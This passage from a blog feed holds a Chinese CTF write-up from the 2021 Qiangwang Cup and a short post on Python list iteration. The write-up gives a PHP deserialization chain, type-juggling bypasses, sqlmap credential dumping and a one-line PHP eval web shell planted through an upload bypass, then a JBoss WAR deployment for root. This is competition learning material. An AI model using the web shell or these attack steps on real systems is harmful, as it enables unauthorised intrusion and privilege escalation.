punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接读<code>/flag</code></p><p>解码得flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="寻宝-SOLVED-Err0r"><a href="#寻宝-SOLVED-Err0r" class="headerlink" title="寻宝 | SOLVED | Err0r"></a>寻宝 | SOLVED | Err0r</h2><h2 id="信息一"><a href="#信息一" class="headerlink" title="信息一"></a>信息一</h2><p>绕就完事，要求能过<code>is_numeric</code>函数，利用变量覆盖赋值</p><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p><code>$num1 &gt; 1024</code></p><p>直接<code>1025a</code>即可</p><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>科学计数法绕过<code>9e9</code></p><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>爆md5<code>61823470</code></p><h3 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>直接<code>aaaaaaa</code></p><h3 id="第五层"><a href="#第五层" class="headerlink" title="第五层"></a>第五层</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"第五层"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token single-quoted-string string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>随便输个<code>a</code>过了…</p><p>拿到KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="信息二"><a href="#信息二" class="headerlink" title="信息二"></a>信息二</h2><p>下载发现一大堆docx文档，估计在文档里找KEY2，写脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6月 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 首先遍历当前目录所有文件及文件夹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 准备循环判断每个元素是否是文件夹还是文件，是文件的话，把名称传入list，是文件夹的话，递归</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># 利用os.path.join()方法取得路径全名，并存入cur_path变量，否则每次只能遍历一层目录</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># 判断是否是文件夹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># 传入空的list接收文件名</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 循环打印show_files函数返回的文件名列表</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>得到</p><pre class="language-none"><code class="language-none">[&#39;xxx&#39;, &#39;xxx&#39;, &#39;KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;]</code></pre><p>然后提交KEY1和KEY2得flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>打开网址发现有三个东西，查看源码</p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>发现路由，都下载下来，有用的hint，其他没用</p><pre class="language-none"><code class="language-none">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmap爆端口</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>得到36842端口，访问发现是登陆界面，给了表名 应该就是注入，试了下发现有回显报错，直接sqlmap跑</p><p>用户名：admin</p><p>密码：99f609527226e076d668668582ac4420</p><p>登陆成功</p><p>扫描发现<code>/file</code>路由有文件上传</p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>绕过过滤</p><p>然后<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>连上shell，需要提权。扫进程和端口，没啥收获，最终应该是打JAVA的jboss</p><p>frp穿出来，根据文章<a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372/article/details/88364032</a></p><p>制作war包，上传后拿到root，读取根目录flag：</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>将字符串两个一组拆分并做short int传入函数判断相等，dbl数组用于比较。跟进去sub_13f3函数。</p><p>经过多组数据测试发现v3(i+1)与v(i)近似相等，因此v3 = 2.718281828459045 - (double)i * v3两边的v3可以看作近似相等，(i+1)v3=2.718281828459045，但是由于循环传入的值不能取得，因此相比答案i的值应该进一步-1，即(flag+2)*dbl=e,flag=e/dbl-2，然后int端序与字符相反，再反一下即可得到正确答案。</p><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>，<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>，<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>脚本跑完直接出flag：flag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;一、战队信息：&quot;&gt;&lt;a href=&quot;#一、战队信息：&quot; class=&quot;headerlink&quot; title=&quot;一、战队信息：&quot;&gt;&lt;/a&gt;一、战队信息：&lt;/h1&gt;&lt;p&gt;战队名称：我是菜鸡QAQ&lt;/p&gt;
&lt;p&gt;战队排名：68名&lt;/p</summary>
      
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>Python dict的小发现</title>
    <link href="https://err0r.top/article/pythondict/"/>
    <id>https://err0r.top/article/pythondict/</id>
    <published>2021-06-08T07:34:43.000Z</published>
    <updated>2021-09-15T03:56:03.034Z</updated>
    
    <content type="html"><![CDATA[<p>记录下撸脚本的时候处理数据用到dict时的有趣发现</p><a id="more"></a><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>先上</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6月 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"剩余任务：%d 个"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果完成就移出此项</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 先pop出dict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果出错再给它加回进队列</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>测试结果如下</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：7 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：5 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：3 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: 